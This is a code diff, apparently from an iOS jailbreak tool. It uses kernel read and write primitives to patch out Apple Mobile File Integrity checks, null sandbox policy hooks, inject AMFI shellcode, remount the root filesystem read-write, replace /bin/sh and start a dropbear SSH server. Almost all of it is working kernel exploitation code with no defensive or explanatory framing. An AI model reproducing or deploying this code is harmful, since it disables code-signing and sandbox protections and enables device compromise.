@@ -29,6 +29,11 @@
 
 #import "patchfinder64.h"
 
+#import "getshell.h"
+
+#import "set.h";
+#import "common.h"
+
 #define vm_address_t mach_vm_address_t
 
 mach_port_t tfp0=0;
@@ -545,108 +550,11 @@ remappage[remapcnt++] = (x & (~PMK));\
     if (NewPointer(release+whole_base) == (NewPointer(release+whole_base+11) - 11)) {
         copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
     }
-    
-    
-    /*
-     tfp0 and patch this bug
-     */
-    {
-        uint64_t endf = prelink_base+prelink_size;
-        uint64_t ends = whole_size - (endf - whole_base);
-        uint32_t* opps_stream = whole_dump + endf - whole_base;
-        uint64_t* ptr_stream = whole_dump + endf - whole_base;
 
-        uint64_t lastk = 0;
-        int streak = 0;
-        
-        for (int i = 0; i < ends/8; i++) {
-            uint64_t offp = ptr_stream[i];
-            if (endf < offp && offp < endf+ends) {
-                offp -= endf;
-                offp /= 4;
-                if (ptr_stream[i+1] == 0 && ptr_stream[i+2] == 0) {
-                    if (opps_stream[offp] == 0x321e03e0 && opps_stream[offp+1] == 0xd65f03c0) {
-                        if (lastk+streak*0x20 == i*8 - 0x20) {
-                            streak++;
-                            if (streak == 9) {
-                                break;
-                            }
-                        } else {
-                            streak=0;
-                            lastk = i*8;
-                        }
-                    }
-                }
-            }
-        }
-        
-        
-        if (streak == 9) {
-
-            
-            char* sbstr = whole_dump + lastk + endf - whole_base - 8;
-            
-            uint64_t extract_attr_recipe = *(uint64_t*)(sbstr + 72 * 0x20 + 8 /*fptr*/);
-            
-            uint32_t* opcode_stream = extract_attr_recipe - whole_base + whole_dump;
-            
-            int l = 0;
-            while (1) {
-                if ((opcode_stream[l] & 0xFFFFFC00) == 0x7103FC00) { // find cmp wX, 0xFF
-                    int cbz = l;
-                    while (1) {
-                        if ((opcode_stream[cbz] & 0xFF000000) == 0xB4000000) {
-                            break;
-                        }
-                        cbz--;
-                    }
-                    
-                    uint64_t ret_target = (opcode_stream[cbz] & 0xFFFFE0) >> 5;
-                    ret_target += cbz;
-                    
-                    
-                    int bhi = l;
-                    while (1) {
-                        if ((opcode_stream[bhi] & 0xFF000000) == 0x54000000) {
-                            break;
-                        }
-                        bhi++;
-                    }
-                    
-                    ret_target -= bhi;
-                    
-                    uint32_t new_opcode = opcode_stream[bhi] & (~0xFFFFE0);
-                    new_opcode |= (ret_target << 5) & 0xFFFFE0;
-                    
-                    RemapPage(extract_attr_recipe + bhi*4);
-                    WriteAnywhere32(NewPointer(extract_attr_recipe+bhi*4), new_opcode);
-                    
-                    break;
-                }
-                l++;
-            }
-            
-            uint64_t tfp = *(uint64_t*)(sbstr + 45 * 0x20 + 8 /*fptr*/);
-            
-            opcode_stream = tfp - whole_base + whole_dump;
-            
-            int cbz = 0;
-            while (1) {
-                if ((opcode_stream[cbz] & 0xFF000000) == 0x34000000) {
-                    break;
-                }
-                cbz++;
-            }
-            
-            RemapPage(tfp + cbz*4);
-            WriteAnywhere32(NewPointer(tfp+cbz*4), 0xd503201f);
-        }
-        
-    }
+  
     /*
      nonceenabler
      */
-    
     {
         uint64_t endf = prelink_base+prelink_size;
         uint64_t ends = whole_size - (endf - whole_base);
@@ -664,155 +572,113 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
     }
     
-    
-    
-    uint64_t memcmp_got = find_amfi_memcmpstub();
-    uint64_t ret1 = find_ret_0();
-    
-    RemapPage(memcmp_got);
-    WriteAnywhere64(NewPointer(memcmp_got), ret1);
-    
-    uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
-    NSLog(@"fref at %llx", fref);
-    
-    uint64_t find_string_reference(char* string, enum Search mode);
-    uint64_t amfiops = 0;
-    //= find_string_reference("Apple Mobile File Integrity", SearchPrelinkExec);
-    char* sbstr = memmem(whole_dump, whole_size, "Apple Mobile File Integrity", strlen("Apple Mobile File Integrity"));
-    for (int i = 0; i < whole_size/8; i++) {
-        if (*(uint64_t*)(whole_dump+i*8) == (sbstr - (uint64_t)whole_dump + whole_base)) {
-            amfiops = *(uint64_t*)(whole_dump+i*8+0x18);
-            break;
-        }
-    }
-    
-    NSLog(@"amfistr at %llx", amfiops);
-    
-    
+    // amfi patch
     {
+        uint64_t memcmp_got = find_amfi_memcmpstub();
+        uint64_t ret1 = find_ret_0();
+  
+        RemapPage(memcmp_got);
+        WriteAnywhere64(NewPointer(memcmp_got), ret1);
+  
+        uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
+        NSLog(@"fref at %llx", fref);
+  
+        uint64_t find_string_reference(char* string, enum Search mode);
+        uint64_t amfiops = 0;
+        //= find_string_reference("Apple Mobile File Integrity", SearchPrelinkExec);
+        char* sbstr = memmem(whole_dump, whole_size, "Apple Mobile File Integrity", strlen("Apple Mobile File Integrity"));
+        for (int i = 0; i < whole_size/8; i++) {
+            if (*(uint64_t*)(whole_dump+i*8) == (sbstr - (uint64_t)whole_dump + whole_base)) {
+                amfiops = *(uint64_t*)(whole_dump+i*8+0x18);
+                break;
+            }
+        }
+  
+        NSLog(@"amfistr at %llx", amfiops);
+  
+  
+        {
+            /*
+             amfi
+             */
+          
+            uint64_t sbops = amfiops;
+            uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
+          
+            uint64_t nopag = sbops_end - sbops;
+          
+            for (int i = 0; i < nopag; i+= PSZ) {
+                RemapPage(((sbops + i) & (~PMK)));
+            }
+            WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
+        }
+  
+  
         /*
-         amfi
+         first str
          */
-        
-        uint64_t sbops = amfiops;
-        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-        
-        uint64_t nopag = sbops_end - sbops;
-        
-        for (int i = 0; i < nopag; i+= PSZ) {
-            RemapPage(((sbops + i) & (~PMK)));
+        while (1) {
+            uint32_t opcode = ReadAnywhere32(fref);
+            if ((opcode & 0xFFC00000) == 0xF9000000) {
+                int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+                int32_t myreg = (opcode >> 5) & 0x1f;
+                uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
+              
+                WriteAnywhere64(rgz, physcode+0x200);
+                break;
+            }
+            fref += 4;
         }
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-    }
-    
-    
-    /*
-     first str
-     */
-    while (1) {
-        uint32_t opcode = ReadAnywhere32(fref);
-        if ((opcode & 0xFFC00000) == 0xF9000000) {
-            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
-            int32_t myreg = (opcode >> 5) & 0x1f;
-            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
-            
-            WriteAnywhere64(rgz, physcode+0x200);
-            break;
-        }
+  
         fref += 4;
-    }
-    
-    fref += 4;
-    
-    /*
-     second str
-     */
-    while (1) {
-        uint32_t opcode = ReadAnywhere32(fref);
-        if ((opcode & 0xFFC00000) == 0xF9000000) {
-            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
-            int32_t myreg = (opcode >> 5) & 0x1f;
-            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
-            
-            WriteAnywhere64(rgz, physcode+0x100);
-            break;
-        }
-        fref += 4;
-    }
-    
-    {
+  
         /*
-         sandbox
+         second str
          */
-        
-        uint64_t sbops = find_sbops();
-        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
-        
-        uint64_t nopag = (sbops_end - sbops)/(PSZ);
-        
-        for (int i = 0; i < nopag; i++) {
-            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
+        while (1) {
+            uint32_t opcode = ReadAnywhere32(fref);
+            if ((opcode & 0xFFC00000) == 0xF9000000) {
+                int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+                int32_t myreg = (opcode >> 5) & 0x1f;
+                uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
+              
+                WriteAnywhere64(rgz, physcode+0x100);
+                break;
+            }
+            fref += 4;
         }
-        
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-        
+  
+  
+        {
+            uint64_t point = find_amfiret()-0x18;
+          
+            RemapPage((point & (~PMK)));
+            uint64_t remap = NewPointer(point);
+          
+            assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
+          
+            WriteAnywhere32(remap, 0x58000041);
+            WriteAnywhere32(remap + 4, 0xd61f0020);
+            WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
+          
+        }
+  
+        for (int i = 0; i < z; i++) {
+            WriteAnywhere64(plist[i], physcode + 0x100);
+        }
+  
+        while (ReadAnywhere32(kernvers+whole_base-4) != 1) {
+            sleep(1);
+        }
+  
+        NSLog(@"enabled patches");
+  
     }
-    
+  
+  
+     // remount root partition r/W
     {
-        uint64_t point = find_amfiret()-0x18;
-        
-        RemapPage((point & (~PMK)));
-        uint64_t remap = NewPointer(point);
-        
-        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
-        
-        WriteAnywhere32(remap, 0x58000041);
-        WriteAnywhere32(remap + 4, 0xd61f0020);
-        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
-        
-    }
-    
-    for (int i = 0; i < z; i++) {
-        WriteAnywhere64(plist[i], physcode + 0x100);
-    }
-    
-    while (ReadAnywhere32(kernvers+whole_base-4) != 1) {
-        sleep(1);
-    }
-    
-    NSLog(@"enabled patches");
-    
-    {
-        // mount patch
+      
         extern uint64_t rootvnode_offset;
         uint64_t rootfs_vnode = ReadAnywhere64(rootvnode_offset + kernbase);
         
@@ -838,7 +704,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         WriteAnywhere32(v_mount + 0x71, v_flag);
     }
-  
+
   
     // load payload
     {
@@ -862,28 +728,37 @@ remappage[remapcnt++] = (x & (~PMK));\
         // copy file
         copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
         copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
+        copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
         copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
         copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
         
         //chmod
         chmod("/tmp/tar-sig", 0755);
         chmod("/bin/sh", 0755);
+        chmod("/tmp/bash-arm64-sig", 0755);
         chmod("/tmp/dropbear-sig", 0755);
-        
-        //exec cmd
+    
       
+        // exec cmd
         posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
         NSLog(@"pid = %x", pd);
         // waitpid(pd, NULL, 0);
         sleep(2);
         printf("Finished unzip bootstrap.tar in /tmp \n");
-        
-        
+			
+				// get generator
+				get_generator();
+			
+        // get shell
+        getshell();
+      
         //launch dropbear
         printf("Launch dropbear on 2222 port\n");
         posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
         NSLog(@"pid = %x", pd);
         waitpid(pd, NULL, 0);
+		
+      
     }
 
     WriteAnywhere64(bsd_task+0x100, orig_cred);
